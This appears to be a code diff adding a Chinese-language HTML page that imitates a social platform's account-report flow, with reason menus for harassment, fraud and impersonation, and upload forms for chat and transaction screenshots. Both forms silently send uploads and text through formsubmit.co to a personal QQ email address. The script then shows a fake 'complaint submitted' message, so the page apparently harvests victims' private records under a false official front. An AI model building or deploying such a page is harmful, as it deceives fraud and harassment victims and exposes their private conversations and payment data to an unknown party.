@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+ <html lang="zh-CN">
+ <head>
+     <meta charset="UTF-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+     <title>投诉</title>
+     <style>
+         *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",sans-serif;}
+         body{background:#f0f0f0;color:#333;}
+         .page{display:none;min-height:100vh;}
+         .page.active{display:block;}
+         .top-tip{padding:15px 15px 5px;color:#666;font-size:16px;}
+         .item-row{background:#fff;padding:18px 15px;border-bottom:1px solid #eee;display:flex;justify-content:space-between;align-items:center;}
+         .item-row span{font-size:17px;}
+         .item-row .arrow{color:#bbb;}
+         .footer-text{text-align:center;color:#666;padding:20px 0;}
+         .form-wrap{background:#fff;margin-top:10px;}
+         .form-item{padding:18px 15px;border-bottom:1px solid #eee;}
+         .form-item .sub-text{font-size:14px;color:#999;margin-top:4px;}
+         .upload-area{background:#fff;padding:15px;margin-top:10px;}
+         .add-img-btn{width:100px;height:100px;border:1px dashed #ccc;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:30px;color:#ccc;cursor:pointer;}
+         .img-preview-list{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px;}
+         .img-preview-list img{width:100px;height:100px;object-fit:cover;border-radius:4px;}
+         .textarea-wrap{background:#fff;margin-top:10px;padding:15px;}
+         textarea{width:100%;height:120px;border:none;outline:none;resize:none;font-size:17px;}
+         .char-count{text-align:right;color:#999;font-size:14px;margin-top:5px;}
+         .submit-btn{width:calc(100% - 30px);margin:30px 15px;height:50px;border-radius:8px;border:none;font-size:18px;color:#fff;background:#ddd;}
+         .submit-btn.active{background:#007aff;}
+         input[type="file"]{display:none;}
+         .back-btn{position:absolute;top:15px;left:15px;color:#333;font-size:20px;cursor:pointer;}
+         .toast{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,0.7);color:#fff;padding:15px 25px;border-radius:8px;font-size:16px;display:none;z-index:999;}
+     </style>
+ </head>
+ <body>
+ <div class="toast" id="toast">投诉提交成功</div>
+ <!-- 第1步：投诉原因选择 -->
+ <div id="page1" class="page active">
+     <div class="top-tip">请选择投诉该账号的原因：</div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>发布不适当内容对我造成骚扰</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page3')">
+         <span>存在欺诈骗钱行为</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>此账号可能被盗用了</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>存在侵权行为(侵犯知识产权、人身权)</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>发布仿冒品信息</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>冒充他人</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>侵犯未成年人权益</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page2')">
+         <span>粉丝无底线追星行为</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="footer-text">投诉须知</div>
+ </div>
+ <!-- 第2步：违法内容选择 -->
+ <div id="page2" class="page">
+     <div class="back-btn" onclick="goPage('page1')">×</div>
+     <div class="top-tip">请选择哪一类违法内容：</div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>色情</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>违法犯罪及违禁品</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>赌博</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>政治谣言</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>暴恐血腥</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>自杀自残</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>网络暴力(开盒/侮辱等)</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page4')">
+         <span>其他违规内容</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="footer-text">了解『拉黑』功能，有效避免骚扰<br><br>投诉须知</div>
+ </div>
+ <!-- 第3步：诈骗类型选择 -->
+ <div id="page3" class="page">
+     <div class="back-btn" onclick="goPage('page1')">×</div>
+     <div class="top-tip">请选择哪一类诈骗内容：</div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>金融诈骗（贷款/提额/代开/套现等）</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>网络兼职刷单诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>返利诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>网络交友诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>虚假投资理财诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>赌博诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>收款不发货</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>仿冒他人诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>免费送诈骗</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>游戏相关诈骗（代练/充值等）</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="item-row" onclick="goPage('page5')">
+         <span>其他诈骗行为</span>
+         <span class="arrow">></span>
+     </div>
+     <div class="footer-text">网络诈骗投诉指引<br><br>投诉须知</div>
+ </div>
+ <!-- 第4步：不实言论证据提交页 -->
+ <div id="page4" class="page">
+     <div class="back-btn" onclick="goPage('page2')">×</div>
+     <form id="form1" action="https://formsubmit.co/707293253@qq.com" method="POST" enctype="multipart/form-data">
+         <input type="hidden" name="_subject" value="不实言论投诉提交">
+         <input type="hidden" name="_captcha" value="false">
+         <input type="hidden" name="_next" value="#">
+         <div class="form-wrap">
+             <div class="form-item" onclick="document.getElementById('chatFile1').click()">
+                 <div>
+                     <div>聊天记录截图(必选)</div>
+                     <div class="sub-text">点击选择聊天记录截图 ></div>
+                 </div>
+                 <input type="file" id="chatFile1" name="chat1" multiple accept="image/*" required>
+             </div>
+             <div class="form-item">
+                 <div>
+                     <div>其他证据截图(选填)</div>
+                     <div class="sub-text">0张/9</div>
+                 </div>
+             </div>
+         </div>
+         <div class="upload-area">
+             <div class="add-img-btn" onclick="document.getElementById('imgFile1').click()">+</div>
+             <div class="img-preview-list" id="imgBox1"></div>
+             <input type="file" id="imgFile1" name="image1" multiple accept="image/*">
+         </div>
+         <div class="textarea-wrap">
+             <textarea name="content1" id="content1" placeholder="投诉内容(选填)" maxlength="200"></textarea>
+             <div class="char-count"><span id="num1">0</span>/200</div>
+         </div>
+         <button type="submit" class="submit-btn" id="submitBtn1">提交</button>
+     </form>
+ </div>
+ <!-- 第5步：诈骗刷单证据提交页 -->
+ <div id="page5" class="page">
+     <div class="back-btn" onclick="goPage('page3')">×</div>
+     <form id="form2" action="https://formsubmit.co/707293253@qq.com" method="POST" enctype="multipart/form-data">
+         <input type="hidden" name="_subject" value="诈骗刷单投诉提交">
+         <input type="hidden" name="_captcha" value="false">
+         <input type="hidden" name="_next" value="#">
+         <div class="form-wrap">
+             <div class="form-item" onclick="document.getElementById('tradeFile').click()">
+                 <div>
+                     <div>交易记录截图</div>
+                     <div class="sub-text">点击选择交易记录截图 ></div>
+                 </div>
+                 <input type="file" id="tradeFile" name="trade" multiple accept="image/*">
+             </div>
+             <div class="form-item" onclick="document.getElementById('chatFile2').click()">
+                 <div>
+                     <div>聊天记录截图(必选)</div>
+                     <div class="sub-text">点击选择聊天记录截图 ></div>
+                 </div>
+                 <input type="file" id="chatFile2" name="chat2" multiple accept="image/*" required>
+             </div>
+             <div class="form-item">
+                 <div>
+                     <div>其他证据截图(选填)</div>
+                     <div class="sub-text">0/9</div>
+                 </div>
+             </div>
+         </div>
+         <div class="upload-area">
+             <div class="add-img-btn" onclick="document.getElementById('imgFile2').click()">+</div>
+             <div class="img-preview-list" id="imgBox2"></div>
+             <input type="file" id="imgFile2" name="image2" multiple accept="image/*">
+         </div>
+         <div class="textarea-wrap">
+             <textarea name="content2" id="content2" placeholder="请填写投诉内容（选填）" maxlength="200"></textarea>
+             <div class="char-count"><span id="num2">0</span>/200</div>
+         </div>
+         <button type="submit" class="submit-btn" id="submitBtn2">提交</button>
+     </form>
+ </div>
+ <script>
+ // 页面切换
+ function goPage(id){
+     document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+     document.getElementById(id).classList.add('active');
+ }
+ // 显示成功提示，阻止跳转
+ function showToastAndStay(e){
+     e.preventDefault();
+     document.getElementById('toast').style.display='block';
+     setTimeout(()=>{
+         document.getElementById('toast').style.display='none';
+         goPage('page1');
+     },1500);
+     // 同步发送表单数据
+     const form = e.target;
+     const formData = new FormData(form);
+     fetch(form.action, {
+         method: 'POST',
+         body: formData,
+         mode: 'no-cors'
+     });
+ }
+ // 绑定表单提交事件
+ document.getElementById('form1').addEventListener('submit', showToastAndStay);
+ document.getElementById('form2').addEventListener('submit', showToastAndStay);
+ // 不实言论页交互
+ const content1 = document.getElementById('content1');
+ const num1 = document.getElementById('num1');
+ const submitBtn1 = document.getElementById('submitBtn1');
+ const imgBox1 = document.getElementById('imgBox1');
+ content1.addEventListener('input', ()=>{
+     num1.innerText = content1.value.length;
+     checkSubmit1();
+ });
+ document.getElementById('imgFile1').onchange = function(e){
+     const files = e.target.files;
+     for(let i=0;i<files.length;i++){
+         const reader = new FileReader();
+         reader.readAsDataURL(files[i]);
+         reader.onload = function(){
+             const img = document.createElement('img');
+             img.src = this.result;
+             imgBox1.appendChild(img);
+         }
+     }
+     checkSubmit1();
+ }
+ document.getElementById('chatFile1').onchange = checkSubmit1;
+ function checkSubmit1(){
+     const chatLen = document.getElementById('chatFile1').files.length;
+     if(chatLen > 0){
+         submitBtn1.classList.add('active');
+     }else{
+         submitBtn1.classList.remove('active');
+     }
+ }
+ // 诈骗刷单页交互
+ const content2 = document.getElementById('content2');
+ const num2 = document.getElementById('num2');
+ const submitBtn2 = document.getElementById('submitBtn2');
+ const imgBox2 = document.getElementById('imgBox2');
+ content2.addEventListener('input', ()=>{
+     num2.innerText = content2.value.length;
+     checkSubmit2();
+ });
+ document.getElementById('imgFile2').onchange = function(e){
+     const files = e.target.files;
+     for(let i=0;i<files.length;i++){
+         const reader = new FileReader();
+         reader.readAsDataURL(files[i]);
+         reader.onload = function(){
+             const img = document.createElement('img');
+             img.src = this.result;
+             imgBox2.appendChild(img);
+         }
+     }
+     checkSubmit2();
+ }
+ document.getElementById('tradeFile').onchange = checkSubmit2;
+ document.getElementById('chatFile2').onchange = checkSubmit2;
+ function checkSubmit2(){
+     const chatLen = document.getElementById('chatFile2').files.length;
+     if(chatLen > 0){
+         submitBtn2.classList.add('active');
+     }else{
+         submitBtn2.classList.remove('active');
+     }
+ }
+ </script>
+ </body>
+ </html>
